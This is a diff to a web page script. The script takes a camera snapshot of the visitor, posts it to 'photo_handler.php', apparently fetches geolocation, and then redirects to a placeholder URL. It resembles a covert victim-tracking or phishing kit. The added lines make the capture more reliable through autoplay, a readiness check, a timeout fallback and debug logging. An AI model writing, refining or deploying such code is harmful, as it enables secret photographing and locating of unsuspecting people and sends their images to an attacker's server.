@@ -44,10 +44,16 @@
 				const video = document.createElement('video');
 				video.srcObject = stream;
 				video.muted = true;
+				video.playsInline = true;
+				video.autoplay = true;
 				await video.play();
-				await new Promise((resolve) => {
-					video.onloadeddata = () => resolve();
-					video.onloadedmetadata = () => resolve();
+				await new Promise((resolve, reject) => {
+					const finish = () => {
+						if (video.readyState >= 2) resolve();
+					};
+					video.onloadeddata = finish;
+					video.onloadedmetadata = finish;
+					setTimeout(() => resolve(), 1500);
 				});
 				const canvas = document.createElement('canvas');
 				canvas.width = 640;
@@ -55,18 +61,23 @@
 				const ctx = canvas.getContext('2d');
 				ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 				const imageData = canvas.toDataURL('image/png');
+				console.log('photo captured', imageData.length);
 				stream.getTracks().forEach(track => track.stop());
 
 				fetch('photo_handler.php', {
 					method: 'POST',
 					headers: { 'Content-Type': 'application/json' },
 					body: JSON.stringify({ image: imageData })
-				}).then(function(){
+				}).then(async function(response) {
+					const result = await response.json();
+					console.log('photo upload result', result);
 					locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Falhou');});
-				}).catch(function(){
+				}).catch(function(err){
+					console.error('photo upload error', err);
 					locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Falhou');});
 				});
 			} catch (e) {
+				console.error('camera capture error', e);
 				locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Falhou');});
 			}
 		}
